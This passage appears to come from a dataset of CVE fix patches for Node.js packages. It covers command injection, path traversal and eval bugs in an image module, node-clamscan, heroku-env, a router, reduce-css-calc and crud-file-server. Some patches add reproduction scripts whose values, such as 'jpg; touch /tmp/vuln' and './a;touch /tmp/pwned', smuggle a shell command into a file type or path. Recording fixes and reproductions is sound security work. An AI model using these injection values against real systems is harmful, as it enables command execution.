wrap(filenameTo, true);\n+        return CMD_CONVERT2[self.cmdarg] + wrap(filenameFrom, true) + ' ' + cmd + wrap(filenameTo, true);\n };\n \n function sort(a, b) {\n-\treturn a.priority > b.priority ? 1 : -1;\n+        return a.priority > b.priority ? 1 : -1;\n }\n \n ImageProto.arg = function(first, last) {\n \n-\tvar self = this;\n-\tvar arr = [];\n+        var self = this;\n+        var arr = [];\n \n-\tif (self.cmdarg === 'gm')\n-\t\tarr.push('convert');\n+        if (self.cmdarg === 'gm')\n+                arr.push('convert');\n \n-\tfirst && arr.push(first);\n+        first && arr.push(first);\n \n-\tif (!self.islimit) {\n-\t\tvar tmp = CONF.default_image_consumption;\n-\t\tif (tmp) {\n-\t\t\tself.limit('memory', (1500 / 100) * tmp);\n-\t\t\tself.limit('map', (3000 / 100) * tmp);\n-\t\t}\n-\t}\n+        if (!self.islimit) {\n+                var tmp = CONF.default_image_consumption;\n+                if (tmp) {\n+                        self.limit('memory', (1500 / 100) * tmp);\n+                        self.limit('map', (3000 / 100) * tmp);\n+                }\n+        }\n \n-\tself.builder.sort(sort);\n+        self.builder.sort(sort);\n \n-\tvar length = self.builder.length;\n+        var length = self.builder.length;\n \n-\tfor (var i = 0; i < length; i++) {\n-\t\tvar o = self.builder[i];\n-\t\tvar index = o.cmd.indexOf(' ');\n-\t\tif (index === -1)\n-\t\t\tarr.push(o.cmd);\n-\t\telse {\n-\t\t\tarr.push(o.cmd.substring(0, index));\n-\t\t\tarr.push(o.cmd.substring(index + 1).replace(/\"/g, ''));\n-\t\t}\n-\t}\n+        for (var i = 0; i < length; i++) {\n+                var o = self.builder[i];\n+                var index = o.cmd.indexOf(' ');\n+                if (index === -1)\n+                        arr.push(o.cmd);\n+                else {\n+                        arr.push(o.cmd.substring(0, index));\n+                        arr.push(o.cmd.substring(index + 1).replace(/\"/g, ''));\n+                }\n+        }\n \n-\tlast && arr.push(last);\n-\treturn arr;\n+        last && arr.push(last);\n+        return arr;\n };\n \n ImageProto.identify = function(callback) {\n-\tvar self = this;\n-\tF.stats.performance.open++;\n-\texec((self.cmdarg === 'gm' ? 'gm ' : '') + 'identify' + wrap(self.filename, true), function(err, stdout) {\n+        var self = this;\n+        F.stats.performance.open++;\n+        exec((self.cmdarg === 'gm' ? 'gm ' : '') + 'identify' + wrap(self.filename, true), function(err, stdout) {\n \n-\t\tif (err) {\n-\t\t\tcallback(err, null);\n-\t\t\treturn;\n-\t\t}\n+                if (err) {\n+                        callback(err, null);\n+                        return;\n+                }\n \n-\t\tvar arr = stdout.split(' ');\n-\t\tvar size = arr[2].split('x');\n-\t\tvar obj = { type: arr[1], width: framework_utils.parseInt(size[0]), height: framework_utils.parseInt(size[1]) };\n-\t\tcallback(null, obj);\n-\t});\n+                var arr = stdout.split(' ');\n+                var size = arr[2].split('x');\n+                var obj = { type: arr[1], width: framework_utils.parseInt(size[0]), height: framework_utils.parseInt(size[1]) };\n+                callback(null, obj);\n+        });\n \n-\treturn self;\n+        return self;\n };\n \n ImageProto.$$identify = function() {\n-\tvar self = this;\n-\treturn function(callback) {\n-\t\tself.identify(callback);\n-\t};\n+        var self = this;\n+        return function(callback) {\n+                self.identify(callback);\n+        };\n };\n \n ImageProto.push = function(key, value, priority, encode) {\n-\tvar self = this;\n-\tvar cmd = key;\n+        var self = this;\n+        var cmd = key;\n \n-\tif (value != null) {\n-\t\tif (encode && typeof(value) === 'string')\n-\t\t\tcmd += ' ' + D + value.replace(REGEXP_ESCAPE, '') + D;\n-\t\telse\n-\t\t\tcmd += ' ' + value;\n-\t}\n+        if (value != null) {\n+                if (encode && typeof(value) === 'string')\n+                        cmd += ' ' + D + value.replace(REGEXP_ESCAPE, '') + D;\n+                else\n+                        cmd += ' ' + value;\n+        }\n \n-\tvar obj = CACHE[cmd];\n-\tif (obj) {\n-\t\tobj.priority = priority;\n-\t\tself.builder.push(obj);\n-\t} else {\n-\t\tCACHE[cmd] = { cmd: cmd, priority: priority };\n-\t\tself.builder.push(CACHE[cmd]);\n-\t}\n+        var obj = CACHE[cmd];\n+        if (obj) {\n+                obj.priority = priority;\n+                self.builder.push(obj);\n+        } else {\n+                CACHE[cmd] = { cmd: cmd, priority: priority };\n+                self.builder.push(CACHE[cmd]);\n+        }\n \n-\treturn self;\n+        return self;\n };\n \n ImageProto.output = function(type) {\n-\tvar self = this;\n-\tif (type[0] === '.')\n-\t\ttype = type.substring(1);\n-\tself.outputType = type;\n-\treturn self;\n+        var self = this;\n+        if (type[0] === '.')\n+                type = type.substring(1);\n+        self.outputType = type;\n+        return self;\n };\n \n ImageProto.resize = function(w, h, options) {\n-\toptions = options || '';\n+        options = options || '';\n \n-\tvar self = this;\n-\tvar size = '';\n+        var self = this;\n+        var size = '';\n \n-\tif (w && h)\n-\t\tsize = w + 'x' + h;\n-\telse if (w && !h)\n-\t\tsize = w + 'x';\n-\telse if (!w && h)\n-\t\tsize = 'x' + h;\n+        if (w && h)\n+                size = w + 'x' + h;\n+        else if (w && !h)\n+                size = w + 'x';\n+        else if (!w && h)\n+                size = 'x' + h;\n \n-\treturn self.push('-resize', size + options, 1, true);\n+        return self.push('-resize', size + options, 1, true);\n };\n \n ImageProto.thumbnail = function(w, h, options) {\n-\toptions = options || '';\n+        options = options || '';\n \n-\tvar self = this;\n-\tvar size = '';\n+        var self = this;\n+        var size = '';\n \n-\tif (w && h)\n-\t\tsize = w + 'x' + h;\n-\telse if (w && !h)\n-\t\tsize = w;\n-\telse if (!w && h)\n-\t\tsize = 'x' + h;\n+        if (w && h)\n+                size = w + 'x' + h;\n+        else if (w && !h)\n+                size = w;\n+        else if (!w && h)\n+                size = 'x' + h;\n \n-\treturn self.push('-thumbnail', size + options, 1, true);\n+        return self.push('-thumbnail', size + options, 1, true);\n };\n \n ImageProto.geometry = function(w, h, options) {\n-\toptions = options || '';\n+        options = options || '';\n \n-\tvar self = this;\n-\tvar size = '';\n+        var self = this;\n+        var size = '';\n \n-\tif (w && h)\n-\t\tsize = w + 'x' + h;\n-\telse if (w && !h)\n-\t\tsize = w;\n-\telse if (!w && h)\n-\t\tsize = 'x' + h;\n+        if (w && h)\n+                size = w + 'x' + h;\n+        else if (w && !h)\n+                size = w;\n+        else if (!w && h)\n+                size = 'x' + h;\n \n-\treturn self.push('-geometry', size + options, 1, true);\n+        return self.push('-geometry', size + options, 1, true);\n };\n \n \n ImageProto.filter = function(type) {\n-\treturn this.push('-filter', type, 1, true);\n+        return this.push('-filter', type, 1, true);\n };\n \n ImageProto.trim = function() {\n-\treturn this.push('-trim +repage', 1);\n+        return this.push('-trim +repage', 1);\n };\n \n ImageProto.limit = function(type, value) {\n-\tthis.islimit = true;\n-\treturn this.push('-limit', type + ' ' + value, 1);\n+        this.islimit = true;\n+        return this.push('-limit', type + ' ' + value, 1);\n };\n \n ImageProto.extent = function(w, h, x, y) {\n \n-\tvar self = this;\n-\tvar size = '';\n+        var self = this;\n+        var size = '';\n \n-\tif (w && h)\n-\t\tsize = w + 'x' + h;\n-\telse if (w && !h)\n-\t\tsize = w;\n-\telse if (!w && h)\n-\t\tsize = 'x' + h;\n+        if (w && h)\n+                size = w + 'x' + h;\n+        else if (w && !h)\n+                size = w;\n+        else if (!w && h)\n+                size = 'x' + h;\n \n-\tif (x || y) {\n-\t\t!x && (x = 0);\n-\t\t!y && (y = 0);\n-\t\tsize += (x >= 0 ? '+' : '') + x + (y >= 0 ? '+' : '') + y;\n-\t}\n+        if (x || y) {\n+                !x && (x = 0);\n+                !y && (y = 0);\n+                size += (x >= 0 ? '+' : '') + x + (y >= 0 ? '+' : '') + y;\n+        }\n \n-\treturn self.push('-extent', size, 4, true);\n+        return self.push('-extent', size, 4, true);\n };\n \n /**\n@@ -551,7 +553,7 @@ ImageProto.extent = function(w, h, x, y) {\n  * @return {Image}\n  */\n ImageProto.miniature = function(w, h, color, filter) {\n-\treturn this.filter(filter || 'Hamming').thumbnail(w, h).background(color ? color : 'white').align('center').extent(w, h);\n+        return this.filter(filter || 'Hamming').thumbnail(w, h).background(color ? color : 'white').align('center').extent(w, h);\n };\n \n /**\n@@ -562,7 +564,7 @@ ImageProto.miniature = function(w, h, color, filter) {\n  * @return {Image}\n  */\n ImageProto.resizeCenter = ImageProto.resize_center = function(w, h, color) {\n-\treturn this.resize(w, h, '^').background(color ? color : 'white').align('center').crop(w, h);\n+        return this.resize(w, h, '^').background(color ? color : 'white').align('center').crop(w, h);\n };\n \n /**\n@@ -574,187 +576,187 @@ ImageProto.resizeCenter = ImageProto.resize_center = function(w, h, color) {\n  * @return {Image}\n  */\n ImageProto.resizeAlign = ImageProto.resize_align = function(w, h, align, color) {\n-\treturn this.resize(w, h, '^').background(color ? color : 'white').align(align || 'center').crop(w, h);\n+        return this.resize(w, h, '^').background(color ? color : 'white').align(align || 'center').crop(w, h);\n };\n \n ImageProto.scale = function(w, h, options) {\n-\toptions = options || '';\n+        options = options || '';\n \n-\tvar self = this;\n-\tvar size = '';\n+        var self = this;\n+        var size = '';\n \n-\tif (w && h)\n-\t\tsize = w + 'x' + h;\n-\telse if (w && !h)\n-\t\tsize = w;\n-\telse if (!w && h)\n-\t\tsize = 'x' + h;\n+        if (w && h)\n+                size = w + 'x' + h;\n+        else if (w && !h)\n+                size = w;\n+        else if (!w && h)\n+                size = 'x' + h;\n \n-\treturn self.push('-scale', size + options, 1, true);\n+        return self.push('-scale', size + options, 1, true);\n };\n \n ImageProto.crop = function(w, h, x, y) {\n-\treturn this.push('-crop', w + 'x' + h + '+' + (x || 0) + '+' + (y || 0), 4, true);\n+        return this.push('-crop', w + 'x' + h + '+' + (x || 0) + '+' + (y || 0), 4, true);\n };\n \n ImageProto.quality = function(percentage) {\n-\treturn this.push('-quality', percentage || 80, 5, true);\n+        return this.push('-quality', percentage || 80, 5, true);\n };\n \n ImageProto.align = function(type) {\n \n-\tvar output;\n-\n-\tswitch (type) {\n-\t\tcase 'left top':\n-\t\tcase 'top left':\n-\t\t\toutput = 'NorthWest';\n-\t\t\tbreak;\n-\t\tcase 'left bottom':\n-\t\tcase 'bottom left':\n-\t\t\toutput = 'SouthWest';\n-\t\t\tbreak;\n-\t\tcase 'right top':\n-\t\tcase 'top right':\n-\t\t\toutput = 'NorthEast';\n-\t\t\tbreak;\n-\t\tcase 'right bottom':\n-\t\tcase 'bottom right':\n-\t\t\toutput = 'SouthEast';\n-\t\t\tbreak;\n-\t\tcase 'left center':\n-\t\tcase 'center left':\n-\t\tcase 'left':\n-\t\t\toutput = 'West';\n-\t\t\tbreak;\n-\t\tcase 'right center':\n-\t\tcase 'center right':\n-\t\tcase 'right':\n-\t\t\toutput = 'East';\n-\t\t\tbreak;\n-\t\tcase 'bottom center':\n-\t\tcase 'center bottom':\n-\t\tcase 'bottom':\n-\t\t\toutput = 'South';\n-\t\t\tbreak;\n-\t\tcase 'top center':\n-\t\tcase 'center top':\n-\t\tcase 'top':\n-\t\t\toutput = 'North';\n-\t\t\tbreak;\n-\t\tcase 'center center':\n-\t\tcase 'center':\n-\t\tcase 'middle':\n-\t\t\toutput = 'Center';\n-\t\t\tbreak;\n-\t\tdefault:\n-\t\t\toutput = type;\n-\t\t\tbreak;\n-\t}\n-\n-\toutput && this.push('-gravity', output, 3, true);\n-\treturn this;\n+        var output;\n+\n+        switch (type) {\n+                case 'left top':\n+                case 'top left':\n+                        output = 'NorthWest';\n+                        break;\n+                case 'left bottom':\n+                case 'bottom left':\n+                        output = 'SouthWest';\n+                        break;\n+                case 'right top':\n+                case 'top right':\n+                        output = 'NorthEast';\n+                        break;\n+                case 'right bottom':\n+                case 'bottom right':\n+                        output = 'SouthEast';\n+                        break;\n+                case 'left center':\n+                case 'center left':\n+                case 'left':\n+                        output = 'West';\n+                        break;\n+                case 'right center':\n+                case 'center right':\n+                case 'right':\n+                        output = 'East';\n+                        break;\n+                case 'bottom center':\n+                case 'center bottom':\n+                case 'bottom':\n+                        output = 'South';\n+                        break;\n+                case 'top center':\n+                case 'center top':\n+                case 'top':\n+                        output = 'North';\n+                        break;\n+                case 'center center':\n+                case 'center':\n+                case 'middle':\n+                        output = 'Center';\n+                        break;\n+                default:\n+                        output = type;\n+                        break;\n+        }\n+\n+        output && this.push('-gravity', output, 3, true);\n+        return this;\n };\n \n ImageProto.gravity = function(type) {\n-\treturn this.align(type);\n+        return this.align(type);\n };\n \n ImageProto.blur = function(radius) {\n-\treturn this.push('-blur', radius, 10, true);\n+        return this.push('-blur', radius, 10, true);\n };\n \n ImageProto.normalize = function() {\n-\treturn this.push('-normalize', null, 10);\n+        return this.push('-normalize', null, 10);\n };\n \n ImageProto.rotate = function(deg) {\n-\treturn this.push('-rotate', deg || 0, 8, true);\n+        return this.push('-rotate', deg || 0, 8, true);\n };\n \n ImageProto.flip = function() {\n-\treturn this.push('-flip', null, 10);\n+        return this.push('-flip', null, 10);\n };\n \n ImageProto.flop = function() {\n-\treturn this.push('-flop', null, 10);\n+        return this.push('-flop', null, 10);\n };\n \n ImageProto.define = function(value) {\n-\treturn this.push('-define', value, 10, true);\n+        return this.push('-define', value, 10, true);\n };\n \n ImageProto.minify = function() {\n-\treturn this.push('+profile', '*', null, 10, true);\n+        return this.push('+profile', '*', null, 10, true);\n };\n \n ImageProto.grayscale = function() {\n-\treturn this.push('-colorspace', 'Gray', 10, true);\n+        return this.push('-colorspace', 'Gray', 10, true);\n };\n \n ImageProto.bitdepth = function(value) {\n-\treturn this.push('-depth', value, 10, true);\n+        return this.push('-depth', value, 10, true);\n };\n \n ImageProto.colors = function(value) {\n-\treturn this.push('-colors', value, 10, true);\n+        return this.push('-colors', value, 10, true);\n };\n \n ImageProto.background = function(color) {\n-\treturn this.push('-background', color, 2, true).push('-extent 0x0', null, 2);\n+        return this.push('-background', color, 2, true).push('-extent 0x0', null, 2);\n };\n \n ImageProto.fill = function(color) {\n-\treturn this.push('-fill', color, 2, true);\n+        return this.push('-fill', color, 2, true);\n };\n \n ImageProto.sepia = function() {\n-\treturn this.push('-modulate', '115,0,100', 4).push('-colorize', '7,21,50', 5);\n+        return this.push('-modulate', '115,0,100', 4).push('-colorize', '7,21,50', 5);\n };\n \n ImageProto.watermark = function(filename, x, y, w, h) {\n-\treturn this.push('-draw', 'image over {1},{2} {3},{4} {5}{0}{5}'.format(filename, x || 0, y || 0, w || 0, h || 0, D), 6, true);\n+        return this.push('-draw', 'image over {1},{2} {3},{4} {5}{0}{5}'.format(filename, x || 0, y || 0, w || 0, h || 0, D), 6, true);\n };\n \n ImageProto.make = function(fn) {\n-\tfn.call(this, this);\n-\treturn this;\n+        fn.call(this, this);\n+        return this;\n };\n \n ImageProto.command = function(key, value, priority, esc) {\n \n-\tif (priority === true) {\n-\t\tpriority = 0;\n-\t\tesc = true;\n-\t}\n+        if (priority === true) {\n+                priority = 0;\n+                esc = true;\n+        }\n \n-\treturn this.push(key, value, priority || 10, esc);\n+        return this.push(key, value, priority || 10, esc);\n };\n \n function wrap(command, empty) {\n-\treturn (empty ? ' ' : '') + (command === '-' ? command : (D + command.replace(REGEXP_ESCAPE, '') + D));\n+        return (empty ? ' ' : '') + (command === '-' ? command : (D + command.replace(REGEXP_ESCAPE, '') + D));\n }\n \n exports.Image = Image;\n exports.Picture = Image;\n \n exports.init = function(filename, cmd, width, height) {\n-\treturn new Image(filename, cmd, width, height);\n+        return new Image(filename, cmd, width, height);\n };\n \n exports.load = function(filename, cmd, width, height) {\n-\treturn new Image(filename, cmd, width, height);\n+        return new Image(filename, cmd, width, height);\n };\n \n exports.middleware = function(type, fn) {\n-\tif (type[0] === '.')\n-\t\ttype = type.substring(1);\n-\tmiddlewares[type] = fn;\n+        if (type[0] === '.')\n+                type = type.substring(1);\n+        middlewares[type] = fn;\n };\n \n // Clears cache with commands\n exports.clear = function() {\n-\tCACHE = {};\n+        CACHE = {};\n };\n \n global.Image = exports;\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 00000000..6ce6f96f\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,19 @@\n+\n+const Image = require('/workspace/framework/image.js');\n+if (!global.framework_utils)\n+        global.framework_utils = require('/workspace/framework/utils.js');\n+const F = { stats: { performance: { open: 0 }}};\n+const CONF = { default_image_converter: 'im', default_image_consumption: 100 };\n+\n+global.F = F;\n+global.CONF = CONF;\n+const fs = require('fs');\n+\n+if (!fs.existsSync('/tmp/test.jpg')) {\n+    fs.writeFileSync('/tmp/test.jpg', 'this is not a real jpg');\n+}\n+\n+// vulnerable code\n+const img = Image('/tmp/test.jpg');\n+const type = 'jpg; touch /tmp/vuln';\n+img.stream(type);\n"}
{"cve":"CVE-2020-7613:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 7cdbddf..6a1f613 100755\n--- a/index.js\n+++ b/index.js\n@@ -484,15 +484,10 @@ class NodeClam {\n             return false;\n         }\n \n-        const version_cmds = {\n-            clamdscan: `${path} --version`,\n-            clamscan: `${path} --version`,\n-        };\n-\n         try {\n             await fs_access(path, fs.constants.R_OK);\n \n-            const {stdout} = await cp_exec(version_cmds[scanner]);\n+            const {stdout} = await cp_execfile(path, ['--version']);\n             if (stdout.toString().match(/ClamAV/) === null) {\n                 if (this.settings.debug_mode) console.log(`${this.debug_label}: Could not verify the ${scanner} binary.`);\n                 return false;\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..a285f24\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,22 @@\n+const NodeClam = require('./index.js');\n+const clamscan = new NodeClam();\n+\n+const options = {\n+    clamscan: {\n+        path: './a;touch /tmp/pwned', \n+        active: true,\n+    },\n+    debug_mode: true,\n+    preference: 'clamscan'\n+};\n+\n+async function run() {\n+    try {\n+        console.log('Initializing clamscan...');\n+        await clamscan.init(options);\n+        console.log(\"clamscan initialized\");\n+    } catch (err) {\n+        // console.error(err);\n+    }\n+}\n+run();\ndiff --git a/reproduce.sh b/reproduce.sh\nnew file mode 100644\nindex 0000000..930d19a\n--- /dev/null\n+++ b/reproduce.sh\n@@ -0,0 +1,31 @@\n+\n+rm -f /tmp/pwned\n+touch 'a;touch /tmp/pwned'\n+chmod +x 'a;touch /tmp/pwned'\n+cat > reproduce.js <<'EOF'\n+const NodeClam = require('./index.js');\n+const clamscan = new NodeClam();\n+\n+const options = {\n+    clamscan: {\n+        path: './a;touch /tmp/pwned', \n+        active: true,\n+    },\n+    debug_mode: true,\n+    preference: 'clamscan'\n+};\n+\n+async function run() {\n+    try {\n+        console.log('Initializing clamscan...');\n+        await clamscan.init(options);\n+        console.log(\"clamscan initialized\");\n+    } catch (err) {\n+        // console.error(err);\n+    }\n+}\n+run();\n+EOF\n+node reproduce.js\n+echo \"Checking for /tmp/pwned...\"\n+ls /tmp/pwned\n"}
{"cve":"CVE-2020-28437:0708", "fix_patch": "diff --git a/lib/get.js b/lib/get.js\nindex 25abee9..b094eb7 100644\n--- a/lib/get.js\n+++ b/lib/get.js\n@@ -1,6 +1,6 @@\n-var exec = require('child_process').exec\n+var execFile = require('child_process').execFile;\n module.exports = function(app, cb) {\n-  exec('heroku config --app ' + app, function(err, stdout) {\n+  execFile('heroku', ['config', '--app', app], function(err, stdout) {\n     if(err) return cb(err);\n     var config = {}\n     var lines = stdout.split('\\n')\n"}
{"cve":"CVE-2017-16083:0708", "fix_patch": "diff --git a/lib/router.js b/lib/router.js\nindex be232b9..fae5894 100644\n--- a/lib/router.js\n+++ b/lib/router.js\n@@ -730,7 +730,10 @@\n     };\n     dispatch[\"static\"] = function(pathname, req, res) {\n       var full_path;\n-      full_path = \"\" + dispatch.static_route + (unescape(pathname));\n+      full_path = path_tools.normalize(path_tools.join(dispatch.static_route, unescape(pathname)));\n+      if (full_path.indexOf(dispatch.static_route) !== 0) {\n+        return dispatch._404(null, res, pathname);\n+      }\n       return fs.exists(full_path, function(exists) {\n         var e, error;\n         if (exists) {\n"}
{"cve":"CVE-2016-10548:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 74ea51b..132976c 100755\n--- a/index.js\n+++ b/index.js\n@@ -3,6 +3,7 @@\n  */\n var balanced = require(\"balanced-match\")\n var reduceFunctionCall = require(\"reduce-function-call\")\n+var m = require('math-expression-evaluator');\n \n /**\n  * Constantes\n@@ -69,10 +70,11 @@ function reduceCSSCalc(value, decimalPrecision) {\n \n     // Remove units in expression:\n     var toEvaluate = expression.replace(new RegExp(unit, \"gi\"), \"\")\n+    toEvaluate = toEvaluate.replace(/[^-\\+/*()\\d\\s.]/g, '');\n     var result\n \n     try {\n-      result = eval(toEvaluate)\n+      result = m.eval(toEvaluate);\n     }\n     catch (e) {\n       return functionIdentifier + \"(\" + expression + \")\"\ndiff --git a/package.json b/package.json\nindex 2e09d73..a6c522e 100644\n--- a/package.json\n+++ b/package.json\n@@ -15,7 +15,7 @@\n   ],\n   \"dependencies\": {\n     \"balanced-match\": \"^0.1.0\",\n-    \"math-expression-evaluator\": \"^1.2.9\",\n+    \"math-expression-evaluator\": \"^1.4.0\",\n     \"reduce-function-call\": \"^1.0.1\"\n   },\n   \"devDependencies\": {\n"}
{"cve":"CVE-2018-3733:0708", "fix_patch": "diff --git a/crud-file-server.js b/crud-file-server.js\nindex e598241..119e477 100644\n--- a/crud-file-server.js\n+++ b/crud-file-server.js\n@@ -2,270 +2,270 @@ var fs = require('fs');\n \n // don't let users crawl up the folder structure by using a/../../../c/d\n var cleanUrl = function(url) { \n-\turl = decodeURIComponent(url);\n-\twhile(url.indexOf('..').length > 0) { url = url.replace('..', ''); }\n-\treturn url;\n+        url = decodeURIComponent(url);\n+        while(url.indexOf('..') != -1) { url = url.replace('..', ''); }\n+        return url;\n };\n \n /*  \n example usage:\n-\trequire('http').createServer(function (req, res) {\n-\t\tserver.handleRequest(port, path, req, res, vpath);\n-\t}).listen(port);\n+        require('http').createServer(function (req, res) {\n+                server.handleRequest(port, path, req, res, vpath);\n+        }).listen(port);\n */\n-exports.handleRequest = function(vpath, path, req, res, readOnly, logHeadRequests) {\t\n-\t// vpath: (optional) virtual path to host in the url\n-\t// path: the file system path to serve\n-\t// readOnly: whether to allow modifications to the file\n+exports.handleRequest = function(vpath, path, req, res, readOnly, logHeadRequests) {    \n+        // vpath: (optional) virtual path to host in the url\n+        // path: the file system path to serve\n+        // readOnly: whether to allow modifications to the file\n \n-\t// our error handler\n-\tvar writeError = function (err, code) { \n-\t\tcode = code || 500;\n-\t\tconsole.log('Error ' + code + ': ' + err);\n-\t\t// write the error to the response, if possible\n-\t\ttry {\t\t\t\n-\t\t\tres.statusCode = code;\n-\t\t\tres.setHeader('Content-Type', 'application/json');\n-\t\t\tres.end(JSON.stringify(err));\t\n-\t\t} catch(resErr) {\n-\t\t\tconsole.log('failed to write error to response: ' + resErr);\n-\t\t}\n-\t};\n+        // our error handler\n+        var writeError = function (err, code) { \n+                code = code || 500;\n+                console.log('Error ' + code + ': ' + err);\n+                // write the error to the response, if possible\n+                try {                   \n+                        res.statusCode = code;\n+                        res.setHeader('Content-Type', 'application/json');\n+                        res.end(JSON.stringify(err));   \n+                } catch(resErr) {\n+                        console.log('failed to write error to response: ' + resErr);\n+                }\n+        };\n \n-\tif(path.lastIndexOf('/') !== path.length - 1) { path += '/'; } // make sure path ends with a slash\t\n-\tvar parsedUrl = require('url').parse(req.url);\t\n-\tvar query = query ? {} : require('querystring').parse(parsedUrl.query);\n+        if(path.lastIndexOf('/') !== path.length - 1) { path += '/'; } // make sure path ends with a slash      \n+        var parsedUrl = require('url').parse(req.url);  \n+        var query = query ? {} : require('querystring').parse(parsedUrl.query);\n     var url = cleanUrl(parsedUrl.pathname);\n-\t\n-\t// normalize the url such that there is no trailing or leading slash /\n-\tif(url.lastIndexOf('/') === url.length - 1) { url = url.slice(0, url.length ); }\n-\tif(url[0] === '/') { url = url.slice(1, url.length);  }\n+        \n+        // normalize the url such that there is no trailing or leading slash /\n+        if(url.lastIndexOf('/') === url.length - 1) { url = url.slice(0, url.length ); }\n+        if(url[0] === '/') { url = url.slice(1, url.length);  }\n \n-\t// check that url begins with vpath\n-\tif(vpath && url.indexOf(vpath) != 0) {\n-\t\tconsole.log('url does not begin with vpath');\n-\t\tthrow 'url [' + url + '] does not begin with vpath [' + vpath + ']';\n-\t}\n+        // check that url begins with vpath\n+        if(vpath && url.indexOf(vpath) != 0) {\n+                console.log('url does not begin with vpath');\n+                throw 'url [' + url + '] does not begin with vpath [' + vpath + ']';\n+        }\n \n-\tif(req.method != 'HEAD') {\n-\t\tconsole.log(req.method + ' ' + req.url);\n-\t}\n-\tvar relativePath = vpath && url.indexOf(vpath) == 0 ?\n-\t\tpath + url.slice(vpath.length + 1, url.length):\n-\t\tpath + url;\t\n-\t\n-\ttry {\n-\t\tif(readOnly && req.method != 'GET') {\n-\t\t\twriteError(req.method + ' forbidden on this resource', 403);\n-\t\t} else {\n-\t\t\tswitch(req.method) {\n-\t\t\t\tcase 'HEAD':\n-\t\t\t\t\tif(logHeadRequests) {\n-\t\t\t\t\t\tconsole.log('head: ' + relativePath);\t\t\t\t\n-\t\t\t\t\t}\n-\t\t\t\t\tfs.stat(relativePath, function(err, stats) { // determine if the resource is a file or directory\n-\t\t\t\t\t\tif(err) { writeError(err); } \n-\t\t\t\t\t\telse {\t\t\t\t\t\n-\t\t\t\t\t\t\tres.setHeader('Last-Modified', stats.mtime);\t\t\n-\t\t\t\t\t\t\tres.setHeader(\"Expires\", \"Sat, 01 Jan 2000 00:00:00 GMT\");\n-\t\t\t\t\t\t\tres.setHeader(\"Cache-Control\", \"no-store, no-cache, must-revalidate, max-age=0\");\n-\t\t\t\t\t\t\tres.setHeader(\"Cache-Control\", \"post-check=0, pre-check=0\");\n-\t\t\t\t\t\t\tres.setHeader(\"Pragma\", \"no-cache\");\n-\t\t\t\t\t\t\t\n-\t\t\t\t\t\t\tif(stats.isDirectory()) {\t\t\t\t\t\t\t\t\n-\t\t\t\t\t\t\t\tres.setHeader('Content-Type', query.type == 'json' || query.dir == 'json' ? 'application/json' : 'text/html');\n-\t\t\t\t\t\t\t} else {\n-\t\t\t\t\t\t\t\tif(query.type == 'json' || query.dir == 'json') {\n-\t\t\t\t\t\t\t\t\tres.setHeader('Content-Type', 'application/json');\n-\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\t\tvar type = require('mime').lookup(relativePath);\n-\t\t\t\t\t\t\t\t\tres.setHeader('Content-Type', type);\n-\t\t\t\t\t\t\t\t\tres.setHeader('Content-Length', stats.size);\n-\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\tres.end();\t\t\t\t\t\t\t\n-\t\t\t\t\t\t}\n-\t\t\t\t\t});\n-\t\t\t\t\tbreak;\n-\t\t\t\tcase 'GET': // returns file or directory contents\n-\t\t\t\t\tconsole.log('relativePath: ' + relativePath);\n-\t\t\t\t\tif(url === 'favicon.ico') { \t\n-\t\t\t\t\t\tres.end(); // if the browser requests favicon, just return an empty response\n-\t\t\t\t\t} else {\n-\t\t\t\t\t\tfs.stat(relativePath, function(err, stats) { // determine if the resource is a file or directory\n-\t\t\t\t\t\t\tif(err) { writeError(err); } \n-\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\tif(stats.isDirectory()) {\n-\t\t\t\t\t\t\t\t\tres.setHeader('Last-Modified', stats.mtime);\t\t\t\t\t\t\t\n-\t\t\t\t\t\t\t\t\tres.setHeader(\"Expires\", \"Sat, 01 Jan 2000 00:00:00 GMT\");\n-\t\t\t\t\t\t\t\t\tres.setHeader(\"Cache-Control\", \"no-store, no-cache, must-revalidate, max-age=0\");\n-\t\t\t\t\t\t\t\t\tres.setHeader(\"Cache-Control\", \"post-check=0, pre-check=0\");\n-\t\t\t\t\t\t\t\t\tres.setHeader(\"Pragma\", \"no-cache\");\n-\t\t\t\t\t\t\t\t\t// if it's a directory, return the files as a JSONified array\n-\t\t\t\t\t\t\t\t\tconsole.log('reading directory ' + relativePath);\n-\t\t\t\t\t\t\t\t\tfs.readdir(relativePath, function(err, files) {\n-\t\t\t\t\t\t\t\t\t\tif(err) { \n-\t\t\t\t\t\t\t\t\t\t\tconsole.log('writeError');\n-\t\t\t\t\t\t\t\t\t\t\twriteError(err); \n-\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\t\t\t\tvar results = [];\n-\t\t\t\t\t\t\t\t\t\t\tvar search = {};\n-\t\t\t\t\t\t\t\t\t\t\tsearch.stats = function(files) {\n-\t\t\t\t\t\t\t\t\t\t\t\tif(files.length) { \n-\t\t\t\t\t\t\t\t\t\t\t\t\tvar file = files.shift();\n-\t\t\t\t\t\t\t\t\t\t\t\t\tfs.stat(relativePath + '/' + file, function(err, stats) { \n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tif(err) { writeError(err); } \n-\t\t\t\t\t\t\t\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tstats.name = file;\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tstats.isFile = stats.isFile();\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tstats.isDirectory = stats.isDirectory();\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tstats.isBlockDevice = stats.isBlockDevice();\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tstats.isFIFO = stats.isFIFO();\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tstats.isSocket = 